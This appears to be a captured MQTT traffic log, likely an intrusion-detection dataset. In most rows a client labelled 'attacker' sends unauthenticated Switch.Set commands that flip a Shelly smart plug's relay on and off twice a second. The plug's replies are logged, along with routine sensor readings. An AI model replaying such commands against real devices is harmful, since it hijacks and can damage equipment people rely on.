2026-04-22T16:38:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34447.02,""swi"
2026-04-22T16:38:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5191 34447.044 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5192 34447.526 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34447.52,""swi"
2026-04-22T16:38:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5193 34447.542 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5194 34448.026 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34448.02,""swi"
2026-04-22T16:38:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5195 34448.045 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5196 34448.528 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34448.52,""swi"
2026-04-22T16:38:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5197 34448.544 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5198 34449.028 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34449.02,""swi"
2026-04-22T16:38:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5199 34449.047 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5200 34449.528 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34449.53,""swi"
2026-04-22T16:38:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5201 34449.545 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:36,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5202 34450.029 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34450.03,""swi"
2026-04-22T16:38:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5203 34450.048 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5204 34450.531 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34450.53,""swi"
2026-04-22T16:38:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5205 34450.548 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5206 34451.030 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34451.03,""swi"
2026-04-22T16:38:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5207 34451.049 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5208 34451.530 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34451.53,""swi"
2026-04-22T16:38:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5209 34451.547 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5210 34452.031 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34452.03,""swi"
2026-04-22T16:38:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5211 34452.049 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5212 34452.532 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34452.53,""swi"
2026-04-22T16:38:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5213 34452.548 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5214 34453.032 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34453.03,""swi"
2026-04-22T16:38:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5215 34453.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5216 34453.533 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34453.53,""swi"
2026-04-22T16:38:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5217 34453.549 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5218 34454.033 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34454.03,""swi"
2026-04-22T16:38:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5219 34454.052 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5220 34454.534 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34454.53,""swi"
2026-04-22T16:38:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5221 34454.551 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5222 34455.037 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34455.03,""swi"
2026-04-22T16:38:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5223 34455.056 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5224 34455.535 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34455.53,""swi"
2026-04-22T16:38:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5225 34455.552 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5226 34456.036 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34456.03,""swi"
2026-04-22T16:38:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5227 34456.055 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5228 34456.537 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34456.53,""swi"
2026-04-22T16:38:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5229 34456.553 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5230 34457.038 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34457.04,""swi"
2026-04-22T16:38:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5231 34457.057 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5232 34457.538 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34457.54,""swi"
2026-04-22T16:38:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5233 34457.554 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5234 34458.039 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34458.04,""swi"
2026-04-22T16:38:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5235 34458.058 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5236 34458.539 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34458.54,""swi"
2026-04-22T16:38:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5237 34458.556 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5238 34459.039 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34459.04,""swi"
2026-04-22T16:38:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5239 34459.058 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5240 34459.543 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34459.54,""swi"
2026-04-22T16:38:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5241 34459.559 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:46,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
